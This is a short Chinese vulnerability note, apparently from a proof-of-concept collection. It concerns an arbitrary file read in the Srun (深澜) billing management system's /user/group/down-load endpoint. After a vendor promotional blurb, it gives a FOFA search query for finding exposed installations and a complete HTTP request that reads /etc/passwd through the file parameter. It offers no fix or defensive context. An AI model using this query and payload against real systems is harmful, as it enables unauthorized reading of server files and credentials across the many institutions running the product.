## 深澜计费管理系统down-load存在任意文件读取漏洞

杭州瀚洋科技有限公司（深澜软件）是全球领先且企业高端用户最多的认证计费技术厂商之一，总部位于中国的杭州。目前全球超过2500家企业选择深澜软件作为其用户认证管理及计费方案；其中在中国Top100高校中有60%使用我们的产品。 作为全球认证计费解决方案的领导品牌

## fofa

```
body="/js/lib/slimscroll.js"
```

## poc

```
GET /user/group/down-load?file=/etc/passwd HTTP/2
Host: 
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=2
```
